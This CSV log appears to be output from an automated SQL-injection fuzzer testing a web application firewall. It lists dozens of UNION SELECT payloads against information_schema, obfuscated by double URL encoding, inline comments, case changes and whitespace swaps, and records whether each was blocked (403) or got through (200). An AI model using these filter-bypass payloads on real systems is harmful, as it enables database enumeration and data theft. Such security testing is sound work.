depth,category,label,reason,confidence,status,length,elapsed,input_preview,parent_preview
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4623,0.00558,1%250AUNION%252509SELECT%252509table_name%252C2%2509FROM%2520information_schema.tables,1%250AUNION%252509SELECT%252509table_name%252C2%2509FROM%2520information_schema.tables
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4624,0.00545,1%250AUNION%252509SELECT%252509table_name%252C2%2509FROM%2520information_schema.tables ,1%250AUNION%252509SELECT%252509table_name%252C2%2509FROM%2520information_schema.tables
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4623,0.00545,1%250AUNION%252509SELECT%252509TABLE_NAME%252C2%2509FROM%2520INFORMATION_SCHEMA.TABLES,1%250AUNION%252509SELECT%252509table_name%252C2%2509FROM%2520information_schema.tables
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4623,0.00526,1%250aunion%252509select%252509table_name%252c2%2509from%2520information_schema.tables,1%250AUNION%252509SELECT%252509table_name%252C2%2509FROM%2520information_schema.tables
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00516,"1
U/**/NION%09SELECT%09table_name,2	FRO/**/M i/**/nformation_schema.tables","1
U/**/NION%09SELECT%09table_name,2	FRO/**/M i/**/nformation_schema.tables"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4612,0.00556,"1
U/**/NION%09SELECT%09table_name,2	FRO/**/M i/**/nformation_schema.tables ","1
U/**/NION%09SELECT%09table_name,2	FRO/**/M i/**/nformation_schema.tables"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00514,"1
U/**/NION%09SELECT%09TABLE_NAME,2	FRO/**/M I/**/NFORMATION_SCHEMA.TABLES","1
U/**/NION%09SELECT%09table_name,2	FRO/**/M i/**/nformation_schema.tables"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00531,"1
u/**/nion%09select%09table_name,2	fro/**/m i/**/nformation_schema.tables","1
U/**/NION%09SELECT%09table_name,2	FRO/**/M i/**/nformation_schema.tables"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4623,0.00512,1%250AUnIoN%252509SeLeCt%252509tAbLe_nAmE%252C2%2509FrOm%2520iNfOrMaTiOn_sChEmA.TaBlEs,"1
UnIoN%09SeLeCt%09tAbLe_nAmE,2	FrOm iNfOrMaTiOn_sChEmA.TaBlEs"
3,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00524,"1
Un/**/IoN%09SeLeCt%09tAbLe_nAmE,2	F/**/rOm i/**/NfOrMaTiOn_sChEmA.TaBlEs","1
UnIoN%09SeLeCt%09tAbLe_nAmE,2	FrOm iNfOrMaTiOn_sChEmA.TaBlEs"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00329,"1
U%6eI%6f%4e%09%53e%4c%65%43t%09t%41%62L%65_n%41m%45,2	FrOm iNfO%72M%61%54iO%6e_s%43hEm%41.Ta%42%6cEs","1
UnIoN%09SeLeCt%09tAbLe_nAmE,2	FrOm iNfOrMaTiOn_sChEmA.TaBlEs"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4737,0.00509,1%250A%252555%25254eION%252509%252553%252545%25254cE%252543T%252509%252574%252561ble_%25256eam%252565%252C2%2509%252546%,"1
%55%4eION%09%53%45%4cE%43T%09%74%61ble_%6eam%65,2	%46%52OM informatio%6e_sche%6da.t%61%62%6c%65%73"
3,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00361,"1
%55%4eION%09%53%45%4cE%43T%09%74%61ble_%6eam%65,2	%46%52OM i/**/nformatio%6e_sche%6da.t%61%62%6c%65%73","1
%55%4eION%09%53%45%4cE%43T%09%74%61ble_%6eam%65,2	%46%52OM informatio%6e_sche%6da.t%61%62%6c%65%73"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00332,"1
%55%4e%49ON%09%53%45%4cE%43%54%09%74%61%62le_%6%65am%65,2	%46%52O%4d inform%61tio%6%65_%73ch%65%6da.%74%61%62%6%63%65%","1
%55%4eION%09%53%45%4cE%43T%09%74%61ble_%6eam%65,2	%46%52OM informatio%6e_sche%6da.t%61%62%6c%65%73"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00325,"1
%55%4eION%09%53%45%4cE%43T%09%74%61ble_%6eam%65,2	%46%52OM
informatio%6e_sche%6da.t%61%62%6c%65%73","1
%55%4eION%09%53%45%4cE%43T%09%74%61ble_%6eam%65,2	%46%52OM informatio%6e_sche%6da.t%61%62%6c%65%73"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00328,"1
%55%4eIoN%09%53%45%4Ce%43t%09%74%61bLe_%6eAm%65,2	%46%52Om iNfOrMaTiO%6e_sChE%6dA.T%61%62%6c%65%73","1
%55%4eION%09%53%45%4cE%43T%09%74%61ble_%6eam%65,2	%46%52OM informatio%6e_sche%6da.t%61%62%6c%65%73"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4619,0.00539,1%2520UnIoN%2520SeLeCt%2520tAbLe_nAmE%252C2%2520FrOm%2520iNfOrMaTiOn_sChEmA.TaBlEs,1%2520UnIoN%2520SeLeCt%2520tAbLe_nAmE%252C2%2520FrOm%2520iNfOrMaTiOn_sChEmA.TaBlEs
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4620,0.00467,1%2520UnIoN%2520SeLeCt%2520tAbLe_nAmE%252C2%2520FrOm%2520iNfOrMaTiOn_sChEmA.TaBlEs ,1%2520UnIoN%2520SeLeCt%2520tAbLe_nAmE%252C2%2520FrOm%2520iNfOrMaTiOn_sChEmA.TaBlEs
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00473,"1 Un/**/IoN Se/**/LeCt tAbLe_nAmE,2 FrO/**/m i/**/NfOrMaTiOn_sChEmA.TaBlEs","1 Un/**/IoN Se/**/LeCt tAbLe_nAmE,2 FrO/**/m i/**/NfOrMaTiOn_sChEmA.TaBlEs"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4612,0.00508,"1 Un/**/IoN Se/**/LeCt tAbLe_nAmE,2 FrO/**/m i/**/NfOrMaTiOn_sChEmA.TaBlEs ","1 Un/**/IoN Se/**/LeCt tAbLe_nAmE,2 FrO/**/m i/**/NfOrMaTiOn_sChEmA.TaBlEs"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.005,"1 UN/**/ION SE/**/LECT TABLE_NAME,2 FRO/**/M I/**/NFORMATION_SCHEMA.TABLES","1 Un/**/IoN Se/**/LeCt tAbLe_nAmE,2 FrO/**/m i/**/NfOrMaTiOn_sChEmA.TaBlEs"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00541,"1 un/**/ion se/**/lect table_name,2 fro/**/m i/**/nformation_schema.tables","1 Un/**/IoN Se/**/LeCt tAbLe_nAmE,2 FrO/**/m i/**/NfOrMaTiOn_sChEmA.TaBlEs"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4745,0.0053,1%2520%252555n%252549%25256f%25254e%2520SeLeC%252574%2520%252574A%252562L%252565_%25256e%252541%25256dE%252C2%2520Fr%252,"1 %55n%49%6f%4e SeLeC%74 %74A%62L%65_%6e%41%6dE,2 Fr%4f%6d %69NfOrMaT%69%4fn_%73Ch%45%6d%41.TaBlE%73"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00451,"1 %55n%49%6f%4e %53eLeC%74 %74A%62L%65_%6e%41%6d%45,2 Fr%4%66%6%64 %69NfOr%4da%54%69%4%66%6e_%73Ch%45%6d%41.T%61%42lE%73","1 %55n%49%6f%4e SeLeC%74 %74A%62L%65_%6e%41%6dE,2 Fr%4f%6d %69NfOrMaT%69%4fn_%73Ch%45%6d%41.TaBlE%73"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00329,"1+%55n%49%6f%4e+SeLeC%74+%74A%62L%65_%6e%41%6dE,2%0aFr%4f%6d	%69NfOrMaT%69%4fn_%73Ch%45%6d%41.TaBlE%73","1 %55n%49%6f%4e SeLeC%74 %74A%62L%65_%6e%41%6dE,2 Fr%4f%6d %69NfOrMaT%69%4fn_%73Ch%45%6d%41.TaBlE%73"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00359,"1 %55n%49%6f%4E SeLeC%74 %74A%62L%65_%6e%41%6dE,2 Fr%4F%6d %69NfOrMaT%69%4Fn_%73Ch%45%6d%41.TaBlE%73","1 %55n%49%6f%4e SeLeC%74 %74A%62L%65_%6e%41%6dE,2 Fr%4f%6d %69NfOrMaT%69%4fn_%73Ch%45%6d%41.TaBlE%73"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4619,0.00612,1%2520UnIoN%252BSeLeCt%2520tAbLe_nAmE%252C2%2520FrOm%2520iNfOrMaTiOn_sChEmA.TaBlEs,"1 UnIoN+SeLeCt tAbLe_nAmE,2 FrOm iNfOrMaTiOn_sChEmA.TaBlEs"
3,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00489,"1 Un/**/IoN+SeLe/**/Ct tAbLe_nAmE,2 Fr/**/Om i/**/NfOrMaTiOn_sChEmA.TaBlEs","1 UnIoN+SeLeCt tAbLe_nAmE,2 FrOm iNfOrMaTiOn_sChEmA.TaBlEs"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00401,"1 U%6eIo%4e+SeL%65%43%74 t%41bLe_nA%6dE,2 %46r%4fm i%4efO%72%4daT%69%4f%6e_%73C%68E%6d%41.%54%61%42%6c%45s","1 UnIoN+SeLeCt tAbLe_nAmE,2 FrOm iNfOrMaTiOn_sChEmA.TaBlEs"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00318,"1+UnIoN+SeLeCt/**/tAbLe_nAmE,2%0aFrOm%09iNfOrMaTiOn_sChEmA.TaBlEs","1 UnIoN+SeLeCt tAbLe_nAmE,2 FrOm iNfOrMaTiOn_sChEmA.TaBlEs"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00543,"1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables","1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4612,0.00576,"1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables ","1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00588,"1 UNI/**/ON SEL/**/ECT TABLE_NAME,2 F/**/ROM I/**/NFORMATION_SCHEMA.TABLES","1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00545,"1 uni/**/on sel/**/ect table_name,2 f/**/rom i/**/nformation_schema.tables","1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4613,0.0055,"1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables  ","1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables "
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4612,0.00521,"1 UNI/**/ON SEL/**/ECT TABLE_NAME,2 F/**/ROM I/**/NFORMATION_SCHEMA.TABLES ","1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables "
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4612,0.00504,"1 uni/**/on sel/**/ect table_name,2 f/**/rom i/**/nformation_schema.tables ","1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables "
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00584,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4622,0.00582,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns ,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00553,1%2520UNION%2520SELECT%2520COLUMN_NAME%252C2%2520FROM%2520INFORMATION_SCHEMA.COLUMNS,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00572,1%2520union%2520select%2520column_name%252c2%2520from%2520information_schema.columns,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4623,0.00548,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns  ,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4622,0.00526,1%2520UNION%2520SELECT%2520COLUMN_NAME%252C2%2520FROM%2520INFORMATION_SCHEMA.COLUMNS ,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4622,0.00509,1%2520union%2520select%2520column_name%252c2%2520from%2520information_schema.columns ,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4723,0.00521,1%2520U%25254eIO%25254e%2520SEL%252545CT%2520c%25256flumn_%25256eame%252C2%2520FR%25254f%25254d%2520in%252566o%252572m%2,1%2520U%25254eIO%25254e%2520SEL%252545CT%2520c%25256flumn_%25256eame%252C2%2520FR%25254f%25254d%2520in%252566o%252572m%2
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4724,0.00537,1%2520U%25254eIO%25254e%2520SEL%252545CT%2520c%25256flumn_%25256eame%252C2%2520FR%25254f%25254d%2520in%252566o%252572m%2,1%2520U%25254eIO%25254e%2520SEL%252545CT%2520c%25256flumn_%25256eame%252C2%2520FR%25254f%25254d%2520in%252566o%252572m%2
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4723,0.00522,1%2520U%25254EIO%25254E%2520SEL%252545CT%2520C%25256FLUMN_%25256EAME%252C2%2520FR%25254F%25254D%2520IN%252566O%252572M%2,1%2520U%25254eIO%25254e%2520SEL%252545CT%2520c%25256flumn_%25256eame%252C2%2520FR%25254f%25254d%2520in%252566o%252572m%2
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4723,0.00523,1%2520u%25254eio%25254e%2520sel%252545ct%2520c%25256flumn_%25256eame%252c2%2520fr%25254f%25254d%2520in%252566o%252572m%2,1%2520U%25254eIO%25254e%2520SEL%252545CT%2520c%25256flumn_%25256eame%252C2%2520FR%25254f%25254d%2520in%252566o%252572m%2
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4735,0.00521,1%2520U%25254eIO%25254e%2520SEL%252545CT%2520c%25256flumn_%25256eame%252C2%2520FR%25254f%25254d%2520i/%252A%252A/n%25256,"1 U%4eIO%4e SEL%45CT c%6flumn_%6eame,2 FR%4f%4d i/**/n%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
3,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4673,0.00547,"1 U%4%65%49O%4e %53E%4c%45C%54 c%6%66l%75m%6e_%6%65ame,2 FR%4f%4d i/**/n%66%6f%72%6d%61%74%69%6f%6%65_sc%68%65m%61.%63%6","1 U%4eIO%4e SEL%45CT c%6flumn_%6eame,2 FR%4f%4d i/**/n%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00308,"1 U%4eIo%4E SeL%45Ct c%6FlUmN_%6EaMe,2 fR%4f%4D I/**/n%66o%72m%61%74%69o%6E_ScH%65M%61.c%6FlU%6dNs","1 U%4eIO%4e SEL%45CT c%6flumn_%6eame,2 FR%4f%4d i/**/n%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00361,"1
U%4eIO%4e SEL%45CT+c%6flumn_%6eame,2 FR%4f%4d%0ai/**/n%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns","1 U%4eIO%4e SEL%45CT c%6flumn_%6eame,2 FR%4f%4d i/**/n%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4739,0.00587,1/%252A%252A/U%25254eIO%25254e%2520SEL%252545CT%25250ac%25256flumn_%25256eame%252C2/%252A%252A/FR%25254f%25254d%250Ain%2,"1/**/U%4eIO%4e SEL%45CT%0ac%6flumn_%6eame,2/**/FR%4f%4d
in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
3,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00343,"1/**/U%4eIO%4e SEL%45CT%0ac%6flumn_%6eame,2/**/FR%4f%4d
i/**/n%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns","1/**/U%4eIO%4e SEL%45CT%0ac%6flumn_%6eame,2/**/FR%4f%4d
in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0037,"1/**/U%4eI%4f%4e SE%4c%45CT%0ac%6fl%75m%6e_%6e%61%6de,2/**/%46%52%4f%4%64
in%66o%72m%61%74%69%6f%6e_sch%65%6d%61.%63%6f%","1/**/U%4eIO%4e SEL%45CT%0ac%6flumn_%6eame,2/**/FR%4f%4d
in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00363,"1/**/u%4EiO%4e sEl%45cT%0aC%6fLuMn_%6eAmE,2/**/fR%4f%4D
In%66o%72m%61%74%69o%6E_ScH%65M%61.c%6FlU%6dNs","1/**/U%4eIO%4e SEL%45CT%0ac%6flumn_%6eame,2/**/FR%4f%4d
in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00372,"1/**/U%4eIO%4e	SEL%45CT%0ac%6flumn_%6eame,2/**/FR%4f%4d
in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns","1/**/U%4eIO%4e SEL%45CT%0ac%6flumn_%6eame,2/**/FR%4f%4d
in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4723,0.00593,1%2520U%25254eIo%25254E%2520SeL%252545Ct%2520c%25256FlUmN_%25256EaMe%252C2%2520fR%25254f%25254D%2520In%252566o%252572m%2,"1 U%4eIo%4E SeL%45Ct c%6FlUmN_%6EaMe,2 fR%4f%4D In%66o%72m%61%74%69o%6E_ScH%65M%61.c%6FlU%6dNs"
3,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00357,"1 U%4eIo%4E SeL%45Ct c%6FlUmN_%6EaMe,2 fR%4f%4D I/**/n%66o%72m%61%74%69o%6E_ScH%65M%61.c%6FlU%6dNs","1 U%4eIo%4E SeL%45Ct c%6FlUmN_%6EaMe,2 fR%4f%4D In%66o%72m%61%74%69o%6E_ScH%65M%61.c%6FlU%6dNs"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.00355,"1 %55%4%65%49%6f%4E %53eL%45%43t c%6%46l%55%6dN_%6EaMe,2 %66R%4f%4D In%66o%72%6d%61%74%69%6f%6E_Sc%48%65%4d%61.%63%6FlU%","1 U%4eIo%4E SeL%45Ct c%6FlUmN_%6EaMe,2 fR%4f%4D In%66o%72m%61%74%69o%6E_ScH%65M%61.c%6FlU%6dNs"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00348,"1%09U%4eIo%4E/**/SeL%45Ct%09c%6FlUmN_%6EaMe,2 fR%4f%4D In%66o%72m%61%74%69o%6E_ScH%65M%61.c%6FlU%6dNs","1 U%4eIo%4E SeL%45Ct c%6FlUmN_%6EaMe,2 fR%4f%4D In%66o%72m%61%74%69o%6E_ScH%65M%61.c%6FlU%6dNs"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4819,0.00681,1%2520U%25254eIO%25254e%2520SE%25254c%252545%252543T%2520%252563%25256%252566l%252575mn_%25256%252565ame%252C2%2520F%252,"1 U%4eIO%4e SE%4c%45%43T %63%6%66l%75mn_%6%65ame,2 F%52%4f%4d i%6e%66o%72%6d%61%74%69o%6e_%73%63h%65%6d%61.c%6%66%6cu%6%"
3,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4697,0.00622,"1 %55%4eI%4f%4%65 SE%4c%45%43T %63%6%66l%75%6d%6e_%6%65%61me,2 F%52%4%66%4%64 %69%6%65%66%6f%72%6d%61%74%69%6f%6e_%73%63","1 U%4eIO%4e SE%4c%45%43T %63%6%66l%75mn_%6%65ame,2 F%52%4f%4d i%6e%66o%72%6d%61%74%69o%6e_%73%63h%65%6d%61.c%6%66%6cu%6%"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00348,"1 U%4eIo%4E Se%4C%45%43t %63%6%66l%75mN_%6%65aMe,2 f%52%4f%4D I%6e%66o%72%6d%61%74%69o%6E_%73%63H%65%6D%61.c%6%66%6cU%6%","1 U%4eIO%4e SE%4c%45%43T %63%6%66l%75mn_%6%65ame,2 F%52%4f%4d i%6e%66o%72%6d%61%74%69o%6e_%73%63h%65%6d%61.c%6%66%6cu%6%"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00338,"1%09U%4eIO%4e SE%4c%45%43T
%63%6%66l%75mn_%6%65ame,2	F%52%4f%4d i%6e%66o%72%6d%61%74%69o%6e_%73%63h%65%6d%61.c%6%66%6cu%","1 U%4eIO%4e SE%4c%45%43T %63%6%66l%75mn_%6%65ame,2 F%52%4f%4d i%6e%66o%72%6d%61%74%69o%6e_%73%63h%65%6d%61.c%6%66%6cu%6%"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00546,1%252BUNION%2509SELECT%2509column_name%252C2%252BFROM%2520information_schema.columns,1%252BUNION%2509SELECT%2509column_name%252C2%252BFROM%2520information_schema.columns
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4622,0.00623,1%252BUNION%2509SELECT%2509column_name%252C2%252BFROM%2520information_schema.columns ,1%252BUNION%2509SELECT%2509column_name%252C2%252BFROM%2520information_schema.columns
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00551,1%252BUNION%2509SELECT%2509COLUMN_NAME%252C2%252BFROM%2520INFORMATION_SCHEMA.COLUMNS,1%252BUNION%2509SELECT%2509column_name%252C2%252BFROM%2520information_schema.columns
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00558,1%252bunion%2509select%2509column_name%252c2%252bfrom%2520information_schema.columns,1%252BUNION%2509SELECT%2509column_name%252C2%252BFROM%2520information_schema.columns
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4613,0.00581,"1+UNIO/**/N	SELE/**/CT	column_name,2+FRO/**/M i/**/nformation_schema.columns","1+UNIO/**/N	SELE/**/CT	column_name,2+FRO/**/M i/**/nformation_schema.columns"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4614,0.00573,"1+UNIO/**/N	SELE/**/CT	column_name,2+FRO/**/M i/**/nformation_schema.columns ","1+UNIO/**/N	SELE/**/CT	column_name,2+FRO/**/M i/**/nformation_schema.columns"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4613,0.00557,"1+UNIO/**/N	SELE/**/CT	COLUMN_NAME,2+FRO/**/M I/**/NFORMATION_SCHEMA.COLUMNS","1+UNIO/**/N	SELE/**/CT	column_name,2+FRO/**/M i/**/nformation_schema.columns"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4613,0.00598,"1+unio/**/n	sele/**/ct	column_name,2+fro/**/m i/**/nformation_schema.columns","1+UNIO/**/N	SELE/**/CT	column_name,2+FRO/**/M i/**/nformation_schema.columns"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00555,1%252BUnIoN%2509SeLeCt%2509cOlUmN_NaMe%252C2%252BfRoM%2520InFoRmAtIoN_ScHeMa.cOlUmNs,"1+UnIoN	SeLeCt	cOlUmN_NaMe,2+fRoM InFoRmAtIoN_ScHeMa.cOlUmNs"
